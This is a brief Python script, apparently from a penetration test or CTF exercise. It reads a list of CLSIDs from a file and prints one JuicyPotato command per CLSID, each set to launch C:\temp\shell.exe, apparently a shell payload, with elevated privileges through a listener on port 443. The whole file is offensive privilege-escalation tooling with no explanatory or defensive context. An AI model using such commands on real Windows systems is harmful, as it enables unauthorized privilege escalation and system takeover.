clsids = []
with open('jeff_CLSIDs.txt') as my_file:
    clsids = my_file.read().splitlines()

for i in clsids:
    print('C:\\temp\\JuicyPotato.exe -t * -p C:\\temp\shell.exe -l 443 -c "',i,'"',sep="")
